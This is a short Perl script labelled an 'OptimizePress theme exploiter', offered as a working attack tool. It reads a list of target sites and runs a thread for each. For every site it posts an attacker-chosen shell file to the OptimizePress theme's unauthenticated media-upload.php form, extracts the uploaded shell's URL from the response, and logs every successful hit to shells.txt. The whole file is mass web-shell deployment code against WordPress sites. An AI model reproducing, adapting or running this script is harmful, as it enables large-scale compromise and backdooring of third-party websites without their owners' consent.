# OptimizePress theme exploiter
use WWW::Mechanize;
use threads;
defined($ARGV[0] && $ARGV[1] && $ARGV[2]) ? $file = $ARGV[0] : die "+ usage: perl $0 sites.txt shell.phtml threads\n";
print "[+] OptimizePress Theme Exploiter\n";
$shell = $ARGV[1];
$thr = $ARGV[2];
open(sites,"<".$file) or die $!;
while($site = <sites>)
{
chomp($site);
$site = cleanurl($site);
push(@threads, threads->create (\&ex, $site));
sleep(1) while(scalar threads->list(threads::running) >= $thr);
}
eval {
$_->join foreach @threads;
@threads = ();
};
close(sites);
sub ex {
print " + $site | ";
eval{
$ex = WWW::Mechanize->new(timeout => 10);
$ex->get("http://".$_[0]."/wp-content/themes/OptimizePress/lib/admin/media-upload.php");
$ex->submit_form(
form_id => "csimgupload",
fields => {
newcsimg => $shell
});
};
if($ex->content() =~ /<img src=\"(.*?)$ARGV[1]"/)
{
print "Shell: ".$1.$ARGV[1]."\n";
# OPEN AND WRITE IN FILE
open(save, '>>shells.txt');   
print save "Shell: ".$1.$ARGV[1]."\n";   
close(save);
# open(my $fh, '>', 'shells.txt');
# print $fh "Shell: ".$1.$ARGV[1]."\n";
# close $fh;
# OPEN AND WRITE IN FILE
}else{
print "failed\n";
}
}
sub cleanurl {
$_[0] =~ /http[s]?:\/\/[www\.]{3}?[\.]?/g ? $_[0] =~ s/http[s]?:\/\/[www\.]{3}?[\.]?//g : "";
$_[0] =~ /http[s]?:\/\//g ? $_[0] =~ s/http[s]?:\/\///g : "";
$_[0] =~ /[\/]$/m ? $_[0] =~ s/[\/]$// : "";
return $_[0];
}